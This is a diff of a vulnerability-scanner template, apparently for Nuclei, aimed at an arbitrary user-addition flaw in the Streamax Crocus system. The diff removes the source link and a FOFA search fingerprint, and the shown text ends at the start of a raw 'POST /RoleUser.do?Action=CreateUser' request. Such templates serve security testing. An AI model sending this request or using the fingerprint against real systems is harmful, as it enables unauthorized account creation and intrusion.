@@ -3,12 +3,8 @@ info:
   name: 锐明Crocus系统存在任意用户添加漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bk6fy44m8a6ylx1u'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bk6fy44m8a6ylx1u
-    fofa: body="inp_verification"
 http:
 - raw:
   - 'POST /RoleUser.do?Action=CreateUser HTTP/1.1
